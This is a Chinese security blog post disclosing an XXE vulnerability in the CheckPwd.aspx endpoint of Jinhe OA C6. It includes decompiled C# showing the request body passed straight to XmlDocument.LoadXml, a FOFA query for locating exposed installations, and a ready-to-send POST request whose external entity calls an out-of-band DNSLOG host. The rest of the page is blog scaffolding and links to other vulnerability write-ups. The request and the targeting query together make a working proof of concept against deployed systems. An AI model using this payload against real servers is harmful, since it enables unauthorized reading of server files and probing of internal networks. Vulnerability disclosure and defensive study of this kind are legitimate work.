---
title: "金和OA CheckPwd.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html
asset_dir: assets/金和oa-checkpwd.aspx-xxe漏洞
---

# 金和OA CheckPwd.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/29 12:02
* 640浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

企业安全咨询

防火墙软件

身份验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CheckPwd.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 CheckPwd.aspx 在 bin 目录下查找 JHSoft.Web.WorkFlat.dll 将其进行反编译后找到 CheckPwd 的处理逻辑

深入探索

JSON处理工具

安全

安全运维咨询

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  string innerText = xmlDocument.DocumentElement.ChildNodes.Item(0).InnerText;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.workflat/CheckPwd.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
%remote;]>
```

深入探索

代码安全审计

在线安全工具

云安全解决方案

在DNSLOG平台成功收到请求

[![金和OA CheckPwd.aspx XXE漏洞](images/img-001-a17b8968ebbd.webp)](https://image.mrxn.net/3c4e418dd4c74201b148398cef7e9368.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA CheckPwd.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 